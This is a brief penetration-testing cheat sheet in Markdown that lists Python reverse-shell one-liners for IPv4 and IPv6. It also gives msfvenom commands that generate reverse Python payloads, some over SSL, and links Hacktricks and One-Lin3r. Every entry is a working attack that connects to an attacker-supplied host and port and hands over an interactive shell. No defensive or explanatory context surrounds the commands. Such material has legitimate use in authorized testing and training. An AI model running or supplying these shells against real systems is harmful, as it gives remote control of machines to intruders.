# Python

## 01 - One-liners

### 1.1 - IPv4

Method 1 with IPv4

```
$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

Method 2 with IPv4

```
$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

### 1.2 - IPv6

```
$ python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("<IPv6>",<PORT>,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
```

## 02 - Generate via `msfvenom`

```
$ msfvenom -p cmd/unix/reverse_python lhost=<IP> lport=<PORT>

$ msfvenom -p cmd/unix/reverse_python_ssl handlersslcert=[/path/to/file.pem] sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT>
```

---
## References

- [Hacktricks: Shells Linux](https://book.hacktricks.xyz/shells/shells/linux)

- [D4Vinci: One-Lin3r](https://github.com/D4Vinci/One-Lin3r)